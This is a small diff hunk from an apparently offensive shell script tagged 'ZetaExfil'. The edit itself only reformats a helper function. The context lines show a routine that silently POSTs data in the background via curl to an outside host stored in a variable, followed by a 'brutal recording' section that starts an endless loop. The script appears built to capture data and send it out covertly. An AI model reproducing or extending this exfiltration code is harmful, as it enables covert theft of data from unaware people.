@@ -8,7 +8,8 @@ S="🧟ZetaExfil"                # tag interno
 
 # == UTILS ==
 q(){ curl -sS -X POST "$N" -H "Title: $S" -d "$1" 2>/dev/null & }
-silent(){ "$@" 2>/dev/null;}
+silent() { "$@" 2>/dev/null; }
+
 
 # == GRABACIÓN BRUTAL ==
 while :;do
